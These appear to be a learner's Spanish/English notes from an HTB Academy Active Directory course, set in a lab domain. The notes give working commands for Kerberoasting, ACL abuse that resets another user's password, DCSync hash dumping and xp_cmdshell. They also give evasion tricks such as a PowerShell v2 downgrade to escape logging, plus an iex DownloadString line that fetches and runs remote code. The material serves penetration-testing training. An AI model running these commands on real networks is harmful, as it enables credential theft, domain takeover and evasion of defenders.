> Above, we determined that the user we are currently using is an administrator on the host ACADEMY-EA-MS01. We can perform the same function for each host to see where we have administrative access. We will see later how well BloodHound performs this type of check. Now we can check for users with the SPN attribute set, which indicates that the account may be subjected to a Kerberoasting attack.

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/e28fa4d5-c623-4ac9-895b-39c7d3caa4ce)

### Finding Users With SPN Set

```
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/24ea9c3b-2c0e-45e2-b1c0-1916d900cb42)


EL powerview mas actualizado:

> https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/situational_awareness/network/powerview.ps1

> PowerView is part of the now deprecated PowerSploit offensive PowerShell toolkit. The tool has been receiving updates by BC-Security as part of their Empire 4 framework. Empire 4 is BC-Security's fork of the original Empire project and is actively maintained as of April 2022. We show examples throughout this module using the development version of PowerView because it is an excellent tool for recon in an Active Directory environment, and is still extremely powerful and helpful in modern AD networks even though the original version is not maintained. The BC-SECURITY version of PowerView has some new functions such as Get-NetGmsa, used to hunt for Group Managed Service Accounts, which is out of scope for this module. It is worth playing around with both versions to see the subtle differences between the old and currently maintained versions.

## SharpView

Otra herramienta con la que vale la pena experimentar es SharpView, una versión .NET de PowerView. Ejecutalo como cualquier otro exe
> SharpView can be useful when a client has hardened against PowerShell usage or we need to avoid using PowerShell.


```
.\SharpView.exe Get-DomainUser -Help
```

### Enum Users

```
.\SharpView.exe Get-DomainUser -Identity forend
```

## Enum shares Snaffler

Enumera todo lo que el usuario tiene acceso al parecer

```
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

> Le -s indica que imprima los resultados en la consola, especifica -del dominio en el que buscar y le -o indica a Snaffler que escriba los resultados en un archivo de registro. La -v opción es el nivel de detalle. Normalmente dataes mejor, ya que solo muestra los resultados en la pantalla, por lo que es más fácil comenzar a revisar las ejecuciones de la herramienta. Snaffler puede producir una cantidad considerable de datos, por lo que normalmente deberíamos enviarlos a un archivo, dejar que se ejecute y luego volver a él más tarde.

lo guarda todo en un el .log

##  BLoodHound desde Windows ( SharpHound.exe)

Ya sabes recolecta todo los datos

```
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

Una vez recopilados los datos se puede abrir la GUI normal desd PS

```
bloodhound
```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/185af5af-3ce7-4ab8-b90b-be1494c6708a)

Aprieta el objeto y ve la informacion de la empresa...

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/126a71c0-2586-4e36-80fa-df86f47c0e27)


![image](https://github.com/gecr07/HTB-Academy/assets/63270579/880d5b5a-4f4a-411f-8593-e724d79c945b)


Si vemos los host antiguos no estan activos.

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/2d637dd8-0b8f-4a5b-98ed-e9e96374f10d)

### Find Computers where Domain Users are Local Adminpara

Permite ver rápidamente si hay algún host donde todos los usuarios tengan derechos de administrador local. Si este es el caso, entonces cualquier cuenta que controlemos normalmente se puede utilizar para acceder a los hosts en cuestión y es posible que podamos recuperar credenciales de la memoria o encontrar otros datos confidenciales.

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/653bd15d-4a11-4089-b987-28cc2a4d4ac7)

### Living of land enum AD ( la mas silenciosa de todas las tecnicas usar comandos de windows)

```
hostname
[System.Environment]::OSVersion.Version # te dice el build version
wmic qfe get Caption,Description,HotFixID,InstalledOn # Te dice los parches instalados
set # muestra las env variables solo en CMD
echo %USERDOMAIN% #Displays the domain name to which the host belongs (ran from CMD-prompt)
echo %logonserver% #CMD Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)
systeminfo #Ya sabes
arp -a # Enumera todos los hosts conocidos almacenados en la tabla arp.
route print # Muestra la tabla de enrutamiento (IPv4 e IPv6) que identifica las redes conocidas y las rutas de capa tres compartidas con el host.
```

> En resumen, los hotfixes son actualizaciones específicas de Microsoft diseñadas para resolver problemas, vulnerabilidades o errores específicos en el sistema operativo Windows o en las aplicaciones de Microsoft. Son una parte importante de mantener la seguridad y la estabilidad de un sistema Windows actualizado.

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/6e0d46d8-b246-4b0f-988f-bbcd620064a5)


![image](https://github.com/gecr07/HTB-Academy/assets/63270579/3756e296-c4f3-4cb2-8f00-bc7f0aedf1c6)

## Powershell Basics

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/5d6efc91-079f-402c-b903-5763eaac637d)

```
Get-ExecutionPolicy -List # Imprimirá la configuración de la política de ejecución para cada alcance en un host.
Get-ChildItem Env: | ft Key,Value # es como set pero mas ordenado y en PS

Set-ExecutionPolicy Bypass -Scope Process # Esto cambiará la política de nuestro proceso actual utilizando el -Scopeparámetro. Al hacerlo, se revertirá la política una vez que abandonemos el proceso o lo finalicemos. Esto es ideal porque no realizaremos un cambio permanente en el host de la víctima
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt # Con esta cadena, podemos obtener el historial de PowerShell del usuario especificado. Esto puede resultar muy útil ya que el historial de comandos puede contener contraseñas o indicarnos archivos de configuración o scripts que contengan contraseñas.

powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>" # Esta es una forma rápida y sencilla de descargar un archivo de la web usando PowerShell y llamarlo desde la memoria.

```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/e1341cea-b2ef-4a4b-ad7b-c397f4320634)


### Powershell 2.0

Muchos defensores desconocen que a menudo existen varias versiones de PowerShell en un host. Si no se desinstalan, aún se pueden utilizar. El registro de eventos de Powershell se introdujo como una característica con Powershell 3.0 y posteriores. Con eso en mente, podemos intentar llamar a Powershell versión 2.0 o anterior. Si tiene éxito, nuestras acciones desde el shell no se registrarán en el Visor de eventos. Esta es una excelente manera de permanecer fuera del radar de los defensores y al mismo tiempo utilizar los recursos integrados en los anfitriones para nuestro beneficio. A continuación se muestra un ejemplo de cómo degradar Powershell.


```
Get-Host #
powershell.exe -version 2
``` 

El comando Get-Host en PowerShell se utiliza para obtener información sobre la sesión actual de PowerShell y el entorno de host en el que se está ejecutando. Proporciona detalles sobre la versión de PowerShell, la cultura regional, la configuración de pantalla y otros aspectos relacionados con la sesión en curso.

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/2d8877ba-e7e5-457b-9cfc-f3e2e8847a90)

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/e0b5862b-e959-457a-99fb-b1f45fb5d702)

> With Script Block Logging enabled, we can see that whatever we type into the terminal gets sent to this log. If we downgrade to PowerShell V2, this will no longer function correctly.

>  Our actions after will be masked since Script Block Logging does not work below PowerShell 3.0. Notice above in the logs that we can see the commands we issued during a normal shell session, but it stopped after starting a new PowerShell instance in version 2.

## Firewall enum

```
netsh advfirewall show allprofiles
```

## Windows Defender

```
sc query windefend CMD
Get-MpComputerStatus PS
```
> Al acceder a un host por primera vez, una cosa importante es verificar y ver si usted es el único que ha iniciado sesión. Si comienza a realizar acciones desde un host en el que se encuentra otra persona, existe la posibilidad de que se fijen en usted. Si se abre una ventana emergente o se cierra la sesión de un usuario, puede informar estas acciones o cambiar su contraseña, y podríamos perder nuestro punto de apoyo.

```
qwinsta
```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/64d86d62-ea40-4583-8f90-bb64b777ca9f)

Para el comando route print:

>  Cualquier red que aparezca en la tabla de enrutamiento es una vía potencial para el movimiento lateral porque se accede a ellas lo suficiente como para agregar una ruta, o se ha configurado administrativamente allí para que el host sepa cómo acceder a los recursos en el dominio. Estos dos comandos pueden ser especialmente útiles en la fase de descubrimiento de una evaluación de caja negra donde tenemos que limitar nuestro escaneo.

## Enum with Windows Management Instrumentation (WMI)

> Windows Management Instrumentation (WMI) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts. For our usage, we will create a WMI report on domain users, groups, processes, and other information from our host and other domain hosts.

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/3f70cbd8-a6fd-480e-a104-c60002f79c91)

## Enum NET commands ( importante)

Para que no sea tan detectado 

> If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing net1 instead of net will execute the same functions without the potential trigger from the net string.

```
net user # Usuarios locales
net user /domain # Usuarios del dominio
net group /domain	#Information about domain groups 
net localgroup # los grupos locales
```

Algunos comandos que utilice para responder las preguntas

```
Get-ADUser -Filter {Enabled -eq $false} | select SamAccountName # Usuarios deshabilitados
net user /domain bross
Get-MpComputerStatus # se usa para ver Gets the status of antimalware software on the computer. Se saca la version 
(AMProductVersion                : 4.18.2109.6)
Get-ADComputer -Identity "ACADEMY-EA-MS01" -Properties * # Enumera todo sobre la computadora
```

## Kerberoasting - from Linux

Our enumeration up to this point has given us a broad picture of the domain and potential issues. We have enumerated user accounts and can see that some are configured with Service Principal Names. Let's see how we can leverage this to move laterally and escalate privileges in the target domain.

> This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running.


Para resumir este ataque se basa en identificar los SPN ( service principal names. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running). Obtienes el hash de tipo TGS-REP y procedes a intentar crackearlos aveces esas cuentas son  priviligeadas o pertenecen a grupos priviligeados.

```
GetUserSPNs.py (Impacket)
### List all SPN

GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

### Request all the tickets

GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request

### Target a single ticket and save the output

GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile hash_output.txt

### Crack Hashcat

hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt

### Testing Authentication against a Domain Controller

sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!

```

## Kerberoasting - from Windows ( algunos conceptos clave)

Existe una manera manual de realizar este proceso pero la verdad no veo util aprender esto ya que tenemos tools como Rubeus que nos permite hacer esto autmatico. ( no por ahora). Desde PowerViewww:

```
Import-Module .\PowerView.ps1
# Obtener toda la lista de SPNs
Get-DomainUser * -spn | select samaccountname
```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/22d8c787-f0a6-465b-bddb-602ef299bdae)

Get especific tarjet

```
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
# Para guardarlos

Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/53abe7b6-56b1-4105-b311-017761c363ad)

### Using Rubeus

Esta es una de las maneras mas faciles ya que automatiza el proceso. Esta herramienta tiene infinidad de opciones poco a poco espero aprender mas

```
Rubeus.exe kerberoast /stats

```
> Let's use Rubeus to request tickets for accounts with the admincount attribute set to 1. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the /nowrap flag so that the hash can be more easily copied down for offline cracking using Hashcat.

Listar las cuenta que pueden ser de administrador¿?

```
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/140d07f5-63de-4c7a-8eb2-64a4ef32d333)



> Indica que un objeto determinado ha cambiado sus ACL a un valor más seguro por el sistema porque era miembro de uno de los grupos administrativos (directamente o transitivamente).

> Usemos Rubeus para solicitar tickets para cuentas con el admincountatributo establecido en 1. Estos probablemente serían objetivos de alto valor y valdrían la pena centrarnos inicialmente en los esfuerzos de craqueo fuera de línea con Hashcat. Asegúrese de especificar la /nowrapbandera para que el hash se pueda copiar más fácilmente para descifrarlo sin conexión usando Hashcat. Según la documentación, el indicador "/nowrap" evita que cualquier blob de ticket base64 se ajuste en columnas para cualquier función"; por lo tanto, no tendremos que preocuparnos por recortar espacios en blanco o nuevas líneas antes de descifrar con Hashcat.

```
 .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

### A Note on Encryption Types

Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. Que aclaro segun lo que tengo entendido Impacket deberia de ser compatible con todos los tickets incluidos los de AES.

#### AES 256, AES 128 y RC4

When performing Kerberoasting in most environments, we will retrieve hashes that begin with $krb5tgs$23$*, an RC4 (type 23) encrypted ticket.

> Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with $krb5tgs$18$*. While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using Hashcat, it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen. Let's walk through an example.

Te puedes dar cuenta entonces que tipos de hashes son dependiendo del numero.

```
.\Rubeus.exe kerberoast /user:testspn /nowrap

```

###  msDS-SupportedEncryptionTypes

Checking with PowerView, we can see that the msDS-SupportedEncryptionTypes attribute is set to 0. The chart here tells us that a decimal value of 0 means that a specific encryption type is not defined and set to the default of RC4_HMAC_MD5. Existe una tabla donde dependiendo del valor es el tipo de encryptacion.

> https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797


Para crackear estos hashes mas seguros

> To run this through Hashcat, we need to use hash mode 19700, which is Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96)

Podemos usar Rubeus con la /tgtdeleg para especificar que solo queremos cifrado RC4 al solicitar un nuevo ticket de servicio. La herramienta hace esto especificando el cifrado RC4 como el único algoritmo que admitimos en el cuerpo de la solicitud TGS. Esto puede ser un mecanismo de seguridad integrado en Active Directory para lograr compatibilidad con versiones anteriores. Al usar esta bandera, podemos solicitar un ticket cifrado RC4 (tipo 23) que se puede descifrar mucho más rápido.

> En la imagen de arriba, podemos ver que al proporcionar la /tgtdelegbandera, la herramienta solicitó un ticket RC4 a pesar de que los tipos de cifrado admitidos figuran como AES 128/256. Este sencillo ejemplo muestra la importancia de una enumeración detallada y de profundizar más al realizar ataques como Kerberoasting. Aquí podríamos bajar de AES a RC4 y reducir el tiempo de descifrado en más de 4 minutos y 30 segundos.

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/0baf965d-7a06-4319-a59d-268b33f99e28)

### ¿Donde no funciona esta flag?

> Nota: Esto no funciona con un controlador de dominio de Windows Server 2019, independientemente del nivel funcional del dominio. Siempre devolverá un ticket de servicio cifrado con el nivel más alto de cifrado admitido por la cuenta de destino. Dicho esto, si nos encontramos en un dominio con controladores de dominio ejecutándose en Server 2016 o anterior (lo cual es bastante común), habilitar AES no mitigará parcialmente el Kerberoasting al devolver solo tickets cifrados AES, que son mucho más difíciles de descifrar, pero más bien permitirá que un atacante solicite un ticket de servicio cifrado RC4. En los DC de Windows Server 2019, habilitar el cifrado AES en una cuenta SPN dará como resultado que recibamos un ticket de servicio AES-256 (tipo 18), que es sustancialmente más difícil (pero no imposible) de descifrar, especialmente si se utiliza una contraseña de diccionario relativamente débil. en uso.


## Access Control List (ACL) Abuse Primer

For security reasons, not all users and computers in an AD environment can access all objects and files. These types of permissions are controlled through Access Control Lists (ACLs).

> In their simplest form, ACLs are lists that define a) who has access to which asset/resource and b) the level of access they are provisioned.

> The settings themselves in an ACL are called Access Control Entities (ACEs). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD. ACLs can also be used for auditing access within AD.

### What are security principals?

A security principal is any entity that can be authenticated by the operating system, such as a user account, a computer account, or a thread or process that runs in the security context of a user or computer account, or the security groups for these accounts. Security principals have long been a foundation for controlling access to securable resources on Windows computers. Each security principal is represented in the operating system by a unique security identifier (SID).


Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD.

ACLs can also be used for auditing access within AD. 

There are two types of ACLs.Entonces en resumen esta asi

ACL (Discretionary Access Control List (DACL) "Aqui estan los permisos entradas ACEs" y System Access Control Lists (SACL) "aqui estan los logs por asi decirlo")
   DACL
      -----> ACE (Access Control Entities)


### Discretionary Access Control List( DACL):

Define a qué principios de seguridad se concede o se deniega el acceso a un objeto. Las DACL se componen de ACE que permiten o deniegan el acceso. Cuando alguien intenta acceder a un objeto, el sistema comprobará en la DACL el nivel de acceso permitido. Si no existe una DACL para un objeto, todos los que intenten acceder al objeto tendrán todos los derechos. Si existe una DACL, pero no tiene ninguna entrada ACE que especifique configuraciones de seguridad específicas, el sistema negará el acceso a todos los usuarios, grupos o procesos que intenten acceder a ella.

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/75cba44e-7693-4296-8440-b74b76de1a16)

   
### System Access Control Lists( SACL)

Permite a los administradores registrar los intentos de acceso realizados a objetos seguros.

Entoncds cada ACE dentro tiene 4 campos mas

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/7af08c7c-439f-437b-8948-608332ecbedf)

Mas graficamente se veria asi:

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/0f9fb074-b3aa-4c3e-ad4b-a5152810126a)


### Enum ACLs


```
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley
```

We can then use the Get-DomainObjectACL function to perform our targeted search. In the below example, we are using this function to find all domain objects that our user has rights over by mapping the user's SID using the $sid variable to the SecurityIdentifier property which is what tells us who has the given right over an object. Se enumera todos lo objetos que ese SID tenga permisos.


> We can then use the Get-DomainObjectACL function to perform our targeted search. In the below example, we are using this function to find all domain objects that our user has rights over by mapping the user's SID using the $sid variable to the SecurityIdentifier property which is what tells us who has the given right over an object. One important thing to note is that if we search without the flag ResolveGUIDs, we will see results like the below, where the right ExtendedRight does not give us a clear picture of what ACE entry the user wley has over damundsen. This is because the ObjectAceType property is returning a GUID value that is not human readable.

```
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

Entonces esto nos regresa un objeto al que ese SID tiene "right over an object" y esto es lo improtante 00299570-246d-11d0-a768-00aa006e0529.

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/fb685907-7462-4521-84fa-1966bf4fc884)

Eso es en lo que te tienes que fijar (ObjectAceType: 00299570-246d-11d0-a768-00aa006e0529) busca en google que tipo de ACE es y es la que permite cambiar el password

> https://learn.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password.

### Busqueda inversa

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/9ad82d46-bf16-4679-995a-4d0984623b8b)

Esto se puede hacer mas facil con PowerView

```
 Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```
Pero bueno entonces usa este comando para ver que ACE tiene cada usuario. recuerda usar el ya que si no ese campo va a aprecer en un formato no legible (PowerView to show us the ObjectAceType in a human-readable format ).

```
$sid2 = Convert-NameToSid damundsen
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/75f12ab5-7ad1-4136-9c09-bcd0282c854f)



### Grupos anidados osea un grupo que es miembro de otro ( padre por asi decirlo)


![image](https://github.com/gecr07/HTB-Academy/assets/63270579/255c4453-64bd-4a19-9d00-4384cafb0baa)



```
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

$itgroupsid = Convert-NameToSid "Information Technology"
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

```

Convertir de un SID a nombre 

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/6f1d8893-2353-43c6-a8a9-74d01601ed1a)


```
 $sid_user=ConvertFrom-SID "S-1-5-21-3842939050-3880317879-2865463114-1164"
```

> The output above shows that our adunn user has DS-Replication-Get-Changes and DS-Replication-Get-Changes-In-Filtered-Set rights over the domain object. This means that this user can be leveraged to perform a DCSync attack. We will cover this attack in-depth in the DCSync section.


![image](https://github.com/gecr07/HTB-Academy/assets/63270579/7af14775-8824-4769-aee9-3b7bd1dc834d)


## Enumeración de ACL con BloodHound

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/21a38b58-e647-47f6-813a-48b624f784e9)

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/2f31bf02-278b-4352-a198-c8dcda89028e)

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/b0b6f077-061c-435e-a0ab-859a0f0d2363)

The output above shows that our adunn user has DS-Replication-Get-Changes and DS-Replication-Get-Changes-In-Filtered-Set rights over the domain object. This means that this user can be leveraged to perform a DCSync attack. We will cover this attack in-depth in the DCSync section. (busca el usuario adunn con el bloodhound)

## ACL Abuse Tactics

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/65d4610b-8c37-42c6-b153-518c8eeae384)

Para hacer todo esto hay que loggearnos como el usuario wley como no se puede vamos a crear un objeto PSCredentials

```
$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# Next, we must create a SecureString object which represents the password we want to set for the target user damundsen.

$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

# Finally, we'll use the Set-DomainUserPassword PowerView function to change the user's password.

Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose


```

Recuerda que aqui usan tanto funciones del modulo de ActiveDirectory como de PowerView

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/ec5faf8c-1c93-48d4-8dc3-ecc3ae65ea4a)

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/c5c29a53-24c5-46cb-9451-3cc7dfd78571)

### Create a fake SPN

```
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

### Kerberoasting with Rubeus


```
.\Rubeus.exe kerberoast /user:adunn /nowrap

hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

## DCSync

DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.

To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.

Based on our work in the previous section, we now have control over the user adunn who has DCSync privileges in the INLANEFREIGHT.LOCAL domain. Let's dig deeper into this attack and go through examples of leveraging it for full domain compromise from both a Linux and a Windows attack host.



### Atacando desde Linux

Primero sacamos los datos necesarios

```
Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
#Con este comando sacamos el SID
#Despues sacamos los ACLs de ese usuario

$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

```

Atacando con Linux

```
 secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5

# Nos genera este output


inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos

```

Existen muchas posibles configuraciones para este comando dependiendo de lo que queramos sacar. 

### Viewing an Account with Reversible Encryption Password Storage Set

When this option is set on a user account, it does not mean that the passwords are stored in cleartext. Instead, they are stored using RC4 encryption. The trick here is that the key needed to decrypt them is stored in the registry (the Syskey) and can be extracted by a Domain Admin or equivalent. Tools such as secretsdump.py will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync.

Para enumerar usuarios con este tipo de cifrado

```
 Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
# Con powerview

Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```
Se puede hacer con mimikatz

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/310d1643-13e7-460b-ade5-ef622b87578d)



## RUNAS

Para correr comandos en el contexto de otro usuario se utiliza esta herramienta.

```
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/eafc11e2-c99e-435f-ace0-af603d618bc4)

## Acceso Privilegiado

 Normalmente, si tomamos el control de una cuenta con derechos de administrador local sobre un host o un conjunto de hosts, podemos realizar un Pass-the-Hashataque para autenticarnos a través del protocolo SMB.


 ![image](https://github.com/gecr07/HTB-Academy/assets/63270579/099bc64d-2964-4cad-9466-de53819d0a06)


### Remote Desktop

Typically, if we have control of a local admin user on a given machine, we will be able to access it via RDP. Sometimes, we will obtain a foothold with a user that does not have local admin rights anywhere, but does have the rights to RDP into one or more machines. This access could be extremely useful to us as we could use the host position to:

Using PowerView, we could use the Get-NetLocalGroupMember function to begin enumerating members of the Remote Desktop Users group on a given host. Let's check out the Remote Desktop Users group on the MS01 host in our target domain.

```
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"


```

From the information above, we can see that all Domain Users (meaning all users in the domain) can RDP to this host. It is common to see this on Remote Desktop Services (RDS) hosts or hosts used as jump hosts. This type of server could be heavily used, and we could potentially find sensitive data (such as credentials) that could be used to further our access, or we may find a local privilege escalation vector that could lead to local admin access and credential theft/account takeover for a user with more privileges in the domain

To test this access, we can either use a tool such as xfreerdp or Remmina from our VM or the Pwnbox or mstsc.exe(ejecutable de RDP) if attacking from a Windows host.


## WinRM (Remote Management Users)

Like RDP, we may find that either a specific user or an entire group has WinRM access to one or more hosts. This could also be low-privileged access that we could use to hunt for sensitive data or attempt to escalate privileges or may result in local admin access, which could potentially be leveraged to further our access. We can again use the PowerView function Get-NetLocalGroupMember to the Remote Management Users group. This group has existed since the days of Windows 8/Windows Server 2012 to enable WinRM access without granting local admin rights.

```
Enumerating the Remote Management Users Group

Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
## RAW Query en BloodHound

MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```


#### Establishing WinRM Session from Windows


```
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred

[ACADEMY-EA-DB01]: PS C:\Users\forend\Documents> hostname
ACADEMY-EA-DB01
[ACADEMY-EA-DB01]: PS C:\Users\forend\Documents> Exit-PSSession
PS C:\htb>
```

### Desde Linux Evil-WinRM

```
gem install evil-winrm
evil-winrm -i 10.129.201.234 -u forend
```

We can connect with just an IP address and valid credentials


## SQL Server Admin

More often than not, we will encounter SQL servers in the environments we face. It is common to find user and service accounts set up with sysadmin privileges on a given SQL server instance. We may obtain credentials for an account with this access via Kerberoasting (common) or others such as LLMNR/NBT-NS Response Spoofing or password spraying. Another way that you may find SQL server credentials is using the tool Snaffler to find web.config or other types of configuration files that contain SQL server connection strings.

BloodHound, once again, is a great bet for finding this type of access via the SQLAdmin edge. We can check for SQL Admin Rights in the Node Info tab for a given user or use this custom Cypher query to search:

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/80763498-118d-4314-9517-b67423dd87c8)


We can use our ACL rights to authenticate with the wley user, change the password for the damundsen user and then authenticate with the target using a tool such as PowerUpSQL, which has a handy command cheat sheet. Let's assume we changed the account password to SQL1234! using our ACL rights. We can now authenticate and run operating system commands.

First, let's hunt for SQL server instances.

#### Enumerating MSSQL Instances with PowerUpSQL

```
PS C:\htb> cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain

 Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```



#### Enumerate in linux (mssqlclient.py)

We can also authenticate from our Linux attack host using mssqlclient.py from the Impacket toolkit.

```
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
help

```

We could then choose enable_xp_cmdshell to enable the xp_cmdshell stored procedure which allows for one to execute operating system commands via the database if the account in question has the proper access rights.

```
enable_xp_cmdshell

```

Para el ejercicio

```
Get-ADGroupMember -Identity "Remote Management Users"
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-DC01 -GroupName "Remote Management Users"
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"


```

Explicacion 

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/412e04f3-33f5-4864-b2df-d99bf7cff622)

En esa imagen checamos el grupo de RPD local nos muestra que todos lo susuarios del dominio pueden hacer RDP. Aqui lo que se entiende es que este es un jump server.


## Acceso privilegiado

Normalmente, si tomamos el control de una cuenta con derechos de administrador local sobre un host o un conjunto de hosts, podemos realizar un Pass-the-Hashataque para autenticarnos a través del protocolo SMB.

Hay varias otras formas en que podemos movernos por un dominio de Windows:

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/16d6ab1c-eeff-4041-a2e8-b073b3674ba1)

Vamos a checar localmente.

```
#PowerView
